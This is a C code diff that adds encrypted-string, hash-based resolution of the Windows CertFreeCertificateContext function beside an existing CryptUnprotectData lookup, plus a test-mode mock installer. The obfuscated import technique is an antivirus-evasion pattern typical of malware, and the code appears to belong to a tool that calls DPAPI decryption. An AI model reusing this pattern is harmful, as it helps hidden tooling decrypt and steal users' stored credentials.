@@ -25,8 +25,22 @@ const crypt32_api_t *mirage_crypt32_api(void) {
     g_crypt32.pUnprotect = (pCryptUnprotectData)mirage_get_function_by_hash(
         mod, mirage_encrypted_hash_func(fn));
 
+    enc_decrypt(enc_CertFreeCertificateContext, ENC_CERTFREECERTIFICATECONTEXT_LEN, fn);
+    g_crypt32.pCertFree = (pCertFreeCertificateContext)mirage_get_function_by_hash(
+        mod, mirage_encrypted_hash_func(fn));
+
     if (!g_crypt32.pUnprotect) return NULL;
+    /* pCertFree may be NULL if cert pinning is not used — not fatal */
 
     g_crypt32.ready = 1;
     return &g_crypt32;
 }
+
+#ifdef ZIALFI_TEST_MODE
+void mirage_crypt32_api_install(const crypt32_api_t *mock) {
+    if (mock) {
+        g_crypt32 = *mock;
+        g_crypt32.ready = 1;
+    }
+}
+#endif
